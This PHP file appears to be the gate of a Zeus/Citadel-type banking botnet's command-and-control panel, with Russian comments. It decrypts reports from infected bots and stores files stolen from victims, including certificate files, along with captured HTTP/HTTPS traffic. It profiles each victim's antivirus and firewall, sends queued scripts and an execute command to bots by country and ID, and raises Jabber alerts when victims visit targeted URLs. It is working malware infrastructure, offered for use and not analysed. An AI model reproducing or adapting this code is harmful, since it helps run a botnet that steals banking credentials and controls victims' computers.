<?php define('__REPORT__', 1);
/*
  Гейт [FIXED]6:11 21.02.2012

  Протокол бот <-> сервер представляет из себя со стороны бота - отсылка отчета о чем либо,
  а со стороны сервера - отправка изменений в настройках( или команды). Со стороны бота, за раз
  отправляется информация об одном событие/объекте.
*/

define('GATE_DEBUG_MODE', 0); # DEBUG MODE. Logs into gate.php.log (if exists)
define('MYSQL_PERSISTENT_MODE', 0); # Persistent connection to MySQL. '1' can speed-up the gate, or can spoil eveything. CAREFUL!

# PHP Error settings
ini_set('error_log', __FILE__.'.error.log'); # Log everything to gate.php.error.log
ini_set('log_errors', 1);
ini_set('display_errors', 0); # don't display errors: this can spoil the protocol
ini_set('ignore_repeated_errors', 1);
ini_set('html_errors', 0);
error_reporting(E_ALL);

# Init
require_once('system/global.php');
require_once('system/config.php');
require_once('system/gate/lib.php');

# Load libs
require_once('system/lib/notify.php');

# Load plugins
foreach (array('vnc','accparse','404') as $plugin)
	if (file_exists($f = "system/gate/gate.plugin.$plugin.php"))
		include $f;

if(@$_SERVER['REQUEST_METHOD'] !== 'POST')
	die(function_exists('e404plugin_display')? e404plugin_display() : '');

# DB connect
if(!connectToDb(MYSQL_PERSISTENT_MODE))
	gate_die('init', 'DB connection failed');

# Init logging
new GateLog(__FILE__.'.log', GATE_DEBUG_MODE ? GateLog::L_TRACE : GateLog::L_NOTICE);
set_error_handler(array(GateLog::get(), 'php_error_handler'));

if (GATE_DEBUG_MODE){
	error_reporting(E_ALL);
	GateLog::get()->log(GateLog::L_TRACE, 'init', 'STARTED>>>>>>');
	function _logshutdown(){
		GateLog::get()->log(GateLog::L_TRACE, 'init', '<<<<<<FINISHED');
		GateLog::get()->flush();
		}
	register_shutdown_function('_logshutdown');
	}

# Analize IPv4 & Ban if needed
$realIpv4   = trim((!empty($_GET['ip']) ? $_GET['ip'] : $_SERVER['REMOTE_ADDR']));

# GeoIP lookup has proved itself to be rather expensive: now it's switchable
$country    = '??';
if (!empty($GLOBALS['config']['reports_geoip']))
	$country = ipv4toc($realIpv4);

/* plugin: 404 */
if (!empty($GLOBALS['config']['allowed_countries_enabled']))
	$country = ipv4toc($realIpv4);
$country_allowed = function_exists('e404plugin_check')? e404plugin_check($country) : true;

# Получаем данные
$data     = @file_get_contents('php://input');
$dataSize = @strlen($data);
if($dataSize < HEADER_SIZE + ITEM_HEADER_SIZE) 
	gate_die('init', '$dataSize too small');

$globalKey = $config['botnet_cryptkey_bin'];
if ($dataSize < BOTCRYPT_MAX_SIZE) rc4($data, $globalKey);
visualDecrypt($data);

# Верификация: если совпадает MD5 - нет смысла проверять что-либо ещё
if(strcmp(md5(substr($data, HEADER_SIZE), true), substr($data, HEADER_MD5, 16)) !== 0)
	gate_die('init', 'md5() verif failed');

//Парсим данные (Сжатие данных не поддерживается).
//Поздравляю мега хакеров, этот алгоритм позволит вам спокойно читать данные бота. Не забудьте написать 18 парсеров и 100 бэкдоров.
$list = array();
for($i = HEADER_SIZE; $i + ITEM_HEADER_SIZE <= $dataSize;){
	$k = @unpack('L4', @substr($data, $i, ITEM_HEADER_SIZE));
	$list[$k[1]] = @substr($data, $i + ITEM_HEADER_SIZE, $k[3]);
	$i += (ITEM_HEADER_SIZE + $k[3]);
	}
unset($data);

//Основные параметры, которые должны быть всегда.
if(empty($list[SBCID_BOT_VERSION]) || empty($list[SBCID_BOT_ID]) || empty($list[SBCID_LOGIN_KEY]))
	gate_die('init', 'Required fields are missing');

//Проверяем ключ для входа. Привет Citadel трекерам.
if(strcasecmp(trim($list[SBCID_LOGIN_KEY]), BO_LOGIN_KEY) != 0)
	gate_die('init', 'Incorrect login key');

///////////////////////////////////////////////////////////////////////////////////////////////////
// Обрабатываем данные.
///////////////////////////////////////////////////////////////////////////////////////////////////

$botId      = str_replace("\x01", "\x02", trim($list[SBCID_BOT_ID]));
$botIdQ     = addslashes($botId);
$botnet     = (empty($list[SBCID_BOTNET])) ? DEFAULT_BOTNET : str_replace("\x01", "\x02", trim($list[SBCID_BOTNET]));
$botnetQ    = addslashes($botnet);
$botVersion = toUint($list[SBCID_BOT_VERSION]);
$countryQ   = $country;
$curTime    = time();

GATE_DEBUG_MODE && GateLog::get()->log(GateLog::L_DEBUG, 'init', "Incoming: $botnet/$botId, v=".intToVersion($botVersion).", IP=$realIpv4, country=$country (".($country_allowed?'allowed':'COUNTRY BANNED').")");

/* plugin: vnc */
if (function_exists('vncplugin_autoconnect'))
	vncplugin_autoconnect($botId);

/* Activity */
$dateQ = date('Y-m-d');
$is_script = (int)(  !empty($list[SBCID_SCRIPT_ID])  );
$is_report = (int)(  !empty($list[SBCID_BOTLOG]) && !empty($list[SBCID_BOTLOG_TYPE])  );
$is_presence = (int)(  !empty($list[SBCID_NET_LATENCY])  );
GATE_DEBUG_MODE && GateLog::get()->log(GateLog::L_TRACE, 'history', "Date $dateQ: is_script=$is_script, is_report=$is_report, is_presence=$is_presence");
mysql_query(
	"INSERT INTO `botnet_activity` VALUES('$botIdQ', '$dateQ',   $curTime, $curTime,   $is_script, $is_report, $is_presence)
	 ON DUPLICATE KEY UPDATE
	    `rtime_last` = $curTime,
	    `c_scripts` = `c_scripts` + $is_script,
	    `c_reports` = `c_reports` + $is_report,
	    `c_presence` = `c_presence` + $is_presence
	 ;
	");

//Отчет об исполнении скрипта.
if(!empty($list[SBCID_SCRIPT_ID]) 
	&& isset($list[SBCID_SCRIPT_STATUS], $list[SBCID_SCRIPT_RESULT]) 
	&& strlen($list[SBCID_SCRIPT_ID]) == 16){
	GATE_DEBUG_MODE && GateLog::get()->log(GateLog::L_TRACE, 'type.script', "Script report: report=".$list[SBCID_SCRIPT_RESULT]);
	if(!mysqlQueryEx('botnet_scripts_stat',
				"INSERT INTO `botnet_scripts_stat` SET `bot_id`='{$botIdQ}', `bot_version`={$botVersion}, `rtime`={$curTime}, ".
				"`extern_id`='".addslashes($list[SBCID_SCRIPT_ID])."',".
				"`type`=".(toInt($list[SBCID_SCRIPT_STATUS]) == 0 ? 2 : 3).",".
				"`report`='".addslashes($list[SBCID_SCRIPT_RESULT])."'")){
		GATE_DEBUG_MODE && GateLog::get()->log(GateLog::L_ERROR, 'type.script', 'MySQL error: '.mysql_error());
		gate_die('type.script', 'Insert(botnet_scripts_stat) failed');
		};
	} # /SBCID_SCRIPT_ID
//Запись логов/файлов.
else if(!empty($list[SBCID_BOTLOG]) && !empty($list[SBCID_BOTLOG_TYPE])){
	$type = toInt($list[SBCID_BOTLOG_TYPE]);
	
	if($type == BLT_FILE){
		GATE_DEBUG_MODE && GateLog::get()->log(GateLog::L_TRACE, 'type.file', "File upload (SRC, DST): "
				.(isset($list[SBCID_PATH_SOURCE])?$list[SBCID_PATH_SOURCE]:'').", ".(isset($list[SBCID_PATH_DEST])?$list[SBCID_PATH_DEST]:'')
		);

		//Расширения, которые представляют возможность удаленного запуска.
		$bad_exts = array(
			'.php3', '.php4', '.php5', '.php',
			'.asp', '.aspx', 
			'.exe', '.cmd', '.bat',
			'.pl', '.cgi', '.phtml',
			'.htaccess'
			);
		$fd_hash  = 0;
		$fd_size  = strlen($list[SBCID_BOTLOG]);
		
		/*o_O*/
		// Фильтранём id бота и название ботнета. Некоторые умельцы умудряются передать кривое имя бота
		$safe_botnet = preg_replace('~[^a-z0-9_-]+~iS', '_', $botnet);
		$safe_botId = preg_replace('~[^a-z0-9_-]+~iS', '_', $botId);
		/*O_o*/
		
		$file_root = $config['reports_path'].'/files/'.urlencode($safe_botnet).'/'.urlencode($safe_botId);
		$file_path = $file_root;
		$last_name = '';
		$l = explode('/', (isset($list[SBCID_PATH_DEST]) && strlen($list[SBCID_PATH_DEST]) > 0 ? str_replace('\\', '/', $list[SBCID_PATH_DEST]) : 'unknown'));
		foreach($l as &$k){
			if(isHackNameForPath($k))
				gate_die('type.file', 'Hack name: path component');
			$file_path .= '/'.($last_name = urlencode($k));
			}
		if(strlen($last_name) === 0)
			$file_path .= '/unknown.dat';
		unset($l);
		
		/*o_O*/
		$dx_good_exts = array(
				'.jpg', '.jpeg', '.png', '.gif', '.bmp', '.pdf',
				'.txt', '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.odt', '.ods',
				'.mkv', '.avi', '.mov', '.mpg', '.mpeg', '.mp4', '.webm',
				'.pfx', '.p12', '.sol'
				);
		
		$file_root; // Папка куда сохранять файл: <reports_path>/files/<botnet>/<botID>
		$dx_file_rel = 'unknown'; // Относительный путь к файлу
		if (  isset($list[SBCID_PATH_DEST]) && strlen($list[SBCID_PATH_DEST]) > 0  )
			$dx_file_rel = $list[SBCID_PATH_DEST];
		// Сохранять надо в "$file_root/$dx_file_rel", где 2й компонент — потенциально опасный
		
		// Сначала отхватим расширение, если оно есть
		$ext = strtolower(strrchr(basename($dx_file_rel), '.'));
		if ($ext === FALSE)
			$ext = '.dat'; // Не было расширения, или левое
			else
			$dx_file_rel = substr($dx_file_rel, 0, -strlen($ext)); // откусить расширение
		if (!in_array($ext, $dx_good_exts))
			$ext = '.dat'; // Рубим левое расширение
		// Очистим опасную часть
		$dx_file_rel = preg_replace('~[^a-z0-9/\\_-]+~iS', '_', $dx_file_rel);
		
		// Склеим части в полный путь до файла
		$file_path = "$file_root/{$dx_file_rel}{$ext}";
		/*O_o*/
		
		//Проверяем расширении, и указываем маску файла.
		if(($ext = strrchr($last_name, '.')) === false || in_array(strtolower($ext), $bad_exts) !== false)
			$file_path .= '.dat';
		
		// Если имя слишком большое.
		if(strlen($file_path) > 180)
			$file_path = $file_root.'/longname.dat';
		
		//Добавляем файл.
		$ext_pos = strrpos($file_path, '.');
		for($i = 0; $i < 9999; $i++){ 
			$f = ($i == 0) ? $file_path : substr_replace($file_path, '('.$i.').', $ext_pos, 1);
			$file_saved_to = $f;
			
			if(file_exists($f)){
				if($fd_size == filesize($f)){
					if($fd_hash === 0)$fd_hash = md5($list[SBCID_BOTLOG], true);
					if(strcmp(md5_file($f, true), $fd_hash) === 0)break;
					}
				}
			else {
				if(!createDir(dirname($file_path)) || !($h = fopen($f, 'wb'))){
					GATE_DEBUG_MODE && GateLog::get()->log(GateLog::L_ERROR, 'type.file', 'mkdir('.dirname($file_path).') failed');
					gate_die('type.file', 'mkdir() failed');
					}
				
				flock($h, LOCK_EX);
				fwrite($h, $list[SBCID_BOTLOG]);
				flock($h, LOCK_UN);
				fclose($h);
				
				break;
				}
			}

		GATE_DEBUG_MODE && GateLog::get()->log(GateLog::L_TRACE, 'type.file', "File upload saved to: ".$file_saved_to);

		# Update FileHunter
		if (isset($list[SBCID_PATH_SOURCE]))
			mysql_query($q=sprintf(
				'UPDATE `botnet_rep_filehunter` SET `f_local`="%s" WHERE `botId`="%s" AND `f_path`="%s";',
				mysql_real_escape_string($file_saved_to),
				mysql_real_escape_string($botId),
				mysql_real_escape_string(trim($list[SBCID_PATH_SOURCE]))
				));
		GATE_DEBUG_MODE && GateLog::get()->log(GateLog::L_TRACE, 'type.file', "Updating FileHunter: rows affected: ".mysql_affected_rows());
		
		} # / $type == BLT_FILE
	else {
		GATE_DEBUG_MODE && GateLog::get()->log(GateLog::L_TRACE, 'type.report', 'Report: type='.$type.', source='.(empty($list[SBCID_PATH_SOURCE])?'-':$list[SBCID_PATH_SOURCE]));
		
		//Запись в базу.
		if($config['reports_to_db'] === 1){
			$table = 'botnet_reports_'.gmdate('ymd', $curTime);
			$query = "INSERT DELAYED INTO `{$table}` SET `bot_id`='{$botIdQ}', `botnet`='{$botnetQ}', `bot_version`={$botVersion}, `type`={$type}, `country`='{$countryQ}', `rtime`={$curTime},".
					"path_source='".  (empty($list[SBCID_PATH_SOURCE])    ? '' : addslashes($list[SBCID_PATH_SOURCE]))."',".
					"path_dest='".    (empty($list[SBCID_PATH_DEST])      ? '' : addslashes($list[SBCID_PATH_DEST]))."',".
					"time_system=".   (empty($list[SBCID_TIME_SYSTEM])    ? 0  : toUint($list[SBCID_TIME_SYSTEM])).",".
					"time_tick=".     (empty($list[SBCID_TIME_TICK])      ? 0  : toUint($list[SBCID_TIME_TICK])).",".
					"time_localbias=".(empty($list[SBCID_TIME_LOCALBIAS]) ? 0  : toInt($list[SBCID_TIME_LOCALBIAS])).",".
					"os_version='".   (empty($list[SBCID_OS_INFO])        ? '' : addslashes($list[SBCID_OS_INFO]))."',".
					"language_id=".   (empty($list[SBCID_LANGUAGE_ID])    ? 0  : toUshort($list[SBCID_LANGUAGE_ID])).",".
					"process_name='". (empty($list[SBCID_PROCESS_NAME])   ? '' : addslashes($list[SBCID_PROCESS_NAME]))."',".
					"process_info='". (empty($list[SBCID_PROCESS_INFO])   ? '' : addslashes($list[SBCID_PROCESS_INFO]))."',".
					"process_user='". (empty($list[SBCID_PROCESS_USER])   ? '' : addslashes($list[SBCID_PROCESS_USER]))."',".
					"ipv4='".          addslashes($realIpv4)."',".
					"context='".       addslashes($list[SBCID_BOTLOG])."'";

			if(!mysqlQueryEx($table, $query) 
				&& (!@mysql_query("CREATE TABLE IF NOT EXISTS `{$table}` LIKE `botnet_reports`") 
				|| !mysqlQueryEx($table, $query))
				){
				GATE_DEBUG_MODE && GateLog::get()->log(GateLog::L_ERROR, 'type.report.db', 'MySQL error: '.mysql_error());
				gate_die('type.report.db', 'Insert(botnet_reports) failed');
				}
			
			/* info on the log line */
			GATE_DEBUG_MODE && GateLog::get()->log(GateLog::L_DEBUG, 'type.report.db', "New report added to $table");
			
			/* plugin: accparse */
			if (function_exists('accparseplugin_parselog'))
				accparseplugin_parselog($list, $botId);
			
			/*o_O(stats_soft)*/
			$soft_list = array(); // array of array(<full-match>, vendor, product, version)
			switch ($type){ // regex matchers: list of software
				case BLT_ANALYTICS_SOFTWARE: // (01: <vendor> | <product> | <version>\n)+
					preg_match_all('~^\d+:\s*([^|]*)\s*\|\s*([^|]*)\s*\|\s*([^|]*)\s*$~ium', $list[SBCID_BOTLOG], $soft_list, PREG_SET_ORDER);
					break;
				case BLT_ANALYTICS_FIREWALL: // (<FieldName>: <Fieldvalue>\n)+
				case BLT_ANALYTICS_ANTIVIRUS:
					preg_match_all('~^Company:\s*(.*)\s*Product:\s*(.*)\s*Version:\s*(.*)\s*$~ium', $list[SBCID_BOTLOG], $soft_list, PREG_SET_ORDER);
					break;
				}
			
			// Insert everything into the DB
			foreach ($soft_list as $soft_line)
				mysqlQueryEx('botnet_software_stat', sprintf(
					'INSERT INTO `botnet_software_stat` VALUES(%d, "%s", "%s", 1) ON DUPLICATE KEY UPDATE `count`=`count`+1;',
					$type, addslashes(trim($soft_line[1])), addslashes(trim($soft_line[2]))
					));
			/*O_o(stats_soft)*/
			}
		
		//Запись в файл.
		if($config['reports_to_fs'] === 1){
			if(isHackNameForPath($botId) || isHackNameForPath($botnet))
				gate_die('type.report.fs', 'Hack name: botId | botnet');
			$file_path = $config['reports_path'].'/other/'.urlencode($botnet).'/'.urlencode($botId);
			if(!createDir($file_path) || !($h = fopen($file_path.'/reports.txt', 'ab'))){
				GATE_DEBUG_MODE && GateLog::get()->log(GateLog::L_ERROR, 'type.report.fs', 'mkdir('.$file_path.') failed');
				gate_die('type.report.fs', 'mkdir failed');
				}
			
			flock($h, LOCK_EX);
			fwrite($h, str_repeat("=", 80)."\r\n".
					"bot_id={$botId}\r\n".
					"botnet={$botnet}\r\n".
					"bot_version=".intToVersion($botVersion)."\r\n".
					"ipv4={$realIpv4}\r\n".
					"country={$country}\r\n".
					"type={$type}\r\n".
					"rtime=".         gmdate('H:i:s d.m.Y', $curTime)."\r\n".
					"time_system=".   (empty($list[SBCID_TIME_SYSTEM])    ? 0  : gmdate('H:i:s d.m.Y', toInt($list[SBCID_TIME_SYSTEM])))."\r\n".//time() тоже возращает int.
					"time_tick=".     (empty($list[SBCID_TIME_TICK])      ? 0  : tickCountToText(toUint($list[SBCID_TIME_TICK]) / 1000))."\r\n".
					"time_localbias=".(empty($list[SBCID_TIME_LOCALBIAS]) ? 0  : timeBiasToText(toInt($list[SBCID_TIME_LOCALBIAS])))."\r\n".
					"os_version=".    (empty($list[SBCID_OS_INFO])        ? '' : osDataToString($list[SBCID_OS_INFO]))."\r\n".
					"language_id=".   (empty($list[SBCID_LANGUAGE_ID])    ? 0  : toUshort($list[SBCID_LANGUAGE_ID]))."\r\n".
					"process_name=".  (empty($list[SBCID_PROCESS_NAME])   ? '' : $list[SBCID_PROCESS_NAME])."\r\n".
					"process_info=".  (empty($list[SBCID_PROCESS_INFO])   ? '' : $list[SBCID_PROCESS_INFO])."\r\n".
					"process_user=".  (empty($list[SBCID_PROCESS_USER])   ? '' : $list[SBCID_PROCESS_USER])."\r\n".
					"path_source=".   (empty($list[SBCID_PATH_SOURCE])    ? '' : $list[SBCID_PATH_SOURCE])."\r\n".
					"context=\r\n".   $list[SBCID_BOTLOG]."\r\n\r\n\r\n");
			flock($h, LOCK_UN);
			fclose($h);
			}
		
		if($config['reports_jn'] === 1)imNotify($type, $list, $botId);
		}
	} # /SBCID_BOTLOG
//Отчет об онлайн-статусе.
else if(!empty($list[SBCID_NET_LATENCY])){
	GATE_DEBUG_MODE && GateLog::get()->log(GateLog::L_TRACE, 'type.latency', 'Latency');
	//Стандартный запрос.
	$query = "`bot_id`='{$botIdQ}', `botnet`='{$botnetQ}', `bot_version`={$botVersion}, `rtime_last`={$curTime}, ".
			"`net_latency`=".   (empty($list[SBCID_NET_LATENCY])    ? 0  : toUint($list[SBCID_NET_LATENCY])).", ".
			"`tcpport_s1`=".    (empty($list[SBCID_TCPPORT_S1])     ? 0  : toUshort($list[SBCID_TCPPORT_S1])).", ".
			"`time_localbias`=".(empty($list[SBCID_TIME_LOCALBIAS]) ? 0  : toInt($list[SBCID_TIME_LOCALBIAS])).", ".
			"`os_version`='".   (empty($list[SBCID_OS_INFO])        ? '' : addslashes($list[SBCID_OS_INFO]))."', ".
			"`language_id`=".   (empty($list[SBCID_LANGUAGE_ID])    ? 0  : toUshort($list[SBCID_LANGUAGE_ID])).", ".
			"`ipv4_list`='".    (empty($list[SBCID_IPV4_ADDRESSES]) ? '' : addslashes($list[SBCID_IPV4_ADDRESSES]))."', ".
			"`ipv6_list`='".    (empty($list[SBCID_IPV6_ADDRESSES]) ? '' : addslashes($list[SBCID_IPV6_ADDRESSES]))."', ".
			"`ipv4`='".         addslashes(pack('N', ip2long($realIpv4)))."'";
	if ($country != '??')
		$query .= ", `country`='$countryQ' ";

	if(!mysqlQueryEx('botnet_list',
				"INSERT INTO `botnet_list` SET `comment`='', `rtime_first`={$curTime}, `rtime_online`={$curTime}, {$query}, `country`='{$countryQ}' ".
				"ON DUPLICATE KEY UPDATE `rtime_online`=IF(`rtime_last` <= ".($curTime - $config['botnet_timeout']).", {$curTime}, `rtime_online`), {$query}")){
		GATE_DEBUG_MODE && GateLog::get()->log(GateLog::L_ERROR, 'type.latency', 'MySQL error: '.mysql_error());
		gate_die('type.latency', 'Insert(botnet_list) failed');
		}

	$botnet_list_affrows = mysql_affected_rows();
	switch ($botnet_list_affrows){ // INSERT gives 1, DUPLICATE gives 2. This magic should work :)
		case 1: # just inserted
			$botnet_list_op = 'INSERT';
			break;
		case 0: # nothing changed
		case 2: # something changed
			$botnet_list_op = 'UPDATE';
			break;
		default:
			$botnet_list_op = 'ERROR';
			break;
	}
	unset($query);

	// Update country on insert
	if ($country == '??' && ($botnet_list_op == 'INSERT' || rand(0,60*3)==0 )){
		$country = ipv4toc($realIpv4);
		mysql_query("UPDATE `botnet_list` SET `country`='{$country}' WHERE `bot_id`='{$botIdQ}';");
	}

		// Notify Jabber subscribers that a new bot has appeared
	if ($botnet_list_op == 'INSERT')
		imNotify($type, $list, $botId, true); // mask check happens beneath the curtain
	
	//Поиск скриптов для отправки.
	$replyData  = '';
	$replyCount = 0;

	$botIdQm   = toSqlSafeMask($botIdQ);
	$botnetQm  = toSqlSafeMask($botnetQ);
	$countryQm = toSqlSafeMask($countryQ);

	$r = mysqlQueryEx('botnet_scripts',
					"SELECT `extern_id`, `script_bin`, `send_limit`, `id`, `name`, `script_text` FROM `botnet_scripts` WHERE `flag_enabled`=1 AND ".
					"(`countries_wl`='' OR `countries_wl` LIKE BINARY '%\x01{$countryQm}\x01%') AND ".
					"(`countries_bl` NOT LIKE BINARY '%\x01{$countryQm}\x01%') AND ".
					"(`botnets_wl`='' OR `botnets_wl` LIKE BINARY '%\x01{$botnetQm}\x01%') AND ".
					"(`botnets_bl` NOT LIKE BINARY '%\x01{$botnetQm}\x01%') AND ".
					"(`bots_wl`='' OR `bots_wl` LIKE BINARY '%\x01{$botIdQm}\x01%') AND ".
					"(`bots_bl` NOT LIKE BINARY '%\x01{$botIdQm}\x01%') ".
					"LIMIT 10");

	if($r)
		while(($m = mysql_fetch_row($r))){
			$eid = addslashes($m[0]);
			
			//Проверяем, не достигнут ли лимит.
			if($m[2] != 0 && ($j = mysqlQueryEx('botnet_scripts_stat', "SELECT COUNT(*) FROM `botnet_scripts_stat` WHERE `type`=1 AND `extern_id`='{$eid}'")) && ($c = mysql_fetch_row($j)) && $c[0] >= $m[2]){
				mysqlQueryEx('botnet_scripts', "UPDATE `botnet_scripts` SET `flag_enabled`=0 WHERE `id`={$m[3]} LIMIT 1");
				continue;
				}
			
			//Добовляем бота в список отправленных.
			GATE_DEBUG_MODE && GateLog::get()->log(GateLog::L_TRACE, 'type.latency', "Sending script: name={$m[4]}: {$m[5]}");
			if(mysqlQueryEx('botnet_scripts_stat', "INSERT HIGH_PRIORITY INTO `botnet_scripts_stat` SET `extern_id`='{$eid}', `type`=1, `bot_id`='{$botIdQ}', `bot_version`={$botVersion}, `rtime`={$curTime}, `report`='Sended'")){
				$size = strlen($m[1]) + strlen($m[0]);
				$replyData .= pack('LLLL', ++$replyCount, 0, $size, $size).$m[0].$m[1];
				}
			}

	if($replyCount > 0){
		$replyData = pack('LLLLLLLL', mt_rand(), mt_rand(), mt_rand(), mt_rand(), mt_rand(), HEADER_SIZE + strlen($replyData), 0, $replyCount).md5($replyData, true).$replyData;
		
		visualEncrypt($replyData);
		rc4($replyData, $globalKey);

		if ($country_allowed)
			echo $replyData;
		die();
		}
	} # /SBCID_NET_LATENCY
	else gate_die('init', 'Unknown report type');

//Отправляем пустой ответ.
sendEmptyReply();

///////////////////////////////////////////////////////////////////////////////////////////////////
// Функции.
///////////////////////////////////////////////////////////////////////////////////////////////////

/*
  Отправка пустого ответа и выход.
*/
function sendEmptyReply(){
	global $country_allowed;
	
	$replyData = pack('LLLLLLLL', mt_rand(), mt_rand(), mt_rand(), mt_rand(), mt_rand(), HEADER_SIZE + ITEM_HEADER_SIZE, 0, 1)."\x4A\xE7\x13\x36\xE4\x4B\xF9\xBF\x79\xD2\x75\x2E\x23\x48\x18\xA5\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0";
	
	visualEncrypt($replyData);
	rc4($replyData, $GLOBALS['globalKey']);
	
	if ($country_allowed) # Send data ONLY when the country is allowed_countries
		echo $replyData;
	die();
	}

/*
  Ковертация Bin2UINT.
  
  IN $str - string, исходная бинарная строка.

  Return  - int, сконвертированное число.
*/
function toUint($str){
	$q = @unpack('L', $str);
	return is_array($q) && is_numeric($q[1]) ? ($q[1] < 0 ? sprintf('%u', $q[1]) : $q[1]) : 0;
	}

/*
  Ковертация Bin2INT.

  IN $str - string, исходная бинарная строка.

  Return  - int, сконвертированное число.
*/
function toInt($str){
	$q = @unpack('l', $str);
	return is_array($q) && is_numeric($q[1]) ? $q[1] : 0;
	}

/*
  Ковертация Bin2SHORT.

  IN $str - string, исходная бинарная строка.

  Return  - int, сконвертированное число.
*/
function toUshort($str){
	$q = @unpack('S', $str);
	return is_array($q) && is_numeric($q[1]) ? $q[1] : 0;
	}

/*
  Проверяет, является ли имя увязимым как часть пути.
  
  IN $name - string, имя для проверки.
  
  Return   - true - если имя увязьмо,
             false - если не увязьимо.
*/
function isHackNameForPath($name){
	$len = strlen($name);
	return ($len > 0 && substr_count($name, '.') < $len && strpos($name, '/') === false && strpos($name, "\\") === false && strpos($name, "\x00") === false) ? false : true;
	}
/*
  Отправка данных об отчете в IM.
  
  IN   - int, тип отчета.
  IN   - array, данные отчета.
  IN  - string, ID бота.
*/
function imNotify(&$type, &$list, &$botId, $defloration = false){
	global $country_allowed;
	
	/*o_O(jabber-new-bot-notify)*/
	$type_ok = (($type == BLT_HTTP_REQUEST || $type == BLT_HTTPS_REQUEST) && !empty($list[SBCID_PATH_SOURCE]));

	$msg_trigger = null;

	# Match botId
	$ml = explode("\x01", $GLOBALS['config']['reports_jn_botmasks']);
	if ($defloration) # bot is added to the database to the first time
		foreach($ml as &$mask)
			if(@preg_match('#^'.str_replace('\\*', '.*', preg_quote($mask, '#')).'$#i', $botId) > 0){
				$msg_trigger = 'botId matched';
				break;
				}

	# Match bot URLs
	$ml = explode("\x01", $GLOBALS['config']['reports_jn_list']);
	if ($type_ok)
		foreach($ml as &$mask)
			if(@preg_match('#^'.str_replace('\\*', '.*', preg_quote($mask, '#')).'$#i', $list[SBCID_PATH_SOURCE]) > 0){
				$msg_trigger = 'URL matched';
				break;
				}

	if (is_null($msg_trigger))
		return;
	/*o_O(/jabber-new-bot-notify)*/
	# Send-Message code

	$message = htmlentities("Reason: $msg_trigger\nBot ID: ".$botId."\nURL: ".$list[SBCID_PATH_SOURCE]."\n\n".substr($list[SBCID_BOTLOG], 0, 1024));

	if(strlen($GLOBALS['config']['reports_jn_logfile']) > 0 
		&& ($fh = @fopen($GLOBALS['config']['reports_jn_logfile'], 'at')) !== false
		){
		@fwrite($fh, $message."\n\n".str_repeat('=', 40)."\n\n");
		@fclose($fh);
		}
	
	GateLog::get()->log(GateLog::L_TRACE, 'Jabber', sprintf("Notify %s : %s", $GLOBALS['config']['reports_jn_to'], $message));
	jabber_notify($GLOBALS['config']['reports_jn_to'], $message);
	
	if(strlen($GLOBALS['config']['reports_jn_script']) > 0){
		$eid       = md5($mask, true);
		$script    = 'user_execute "'.trim($GLOBALS['config']['reports_jn_script']).'" -f';
		$size      = strlen($eid) + strlen($script);
		$replyData = pack('LLLL', 1, 0, $size, $size).$eid.$script;
		$replyData = pack('LLLLLLLL', mt_rand(), mt_rand(), mt_rand(), mt_rand(), mt_rand(), HEADER_SIZE + strlen($replyData), 0, 1).md5($replyData, true).$replyData;

		visualEncrypt($replyData);
		rc4($replyData, $GLOBALS['globalKey']);
	
		if ($country_allowed)
			echo $replyData;
		die();
		}
	}
?>
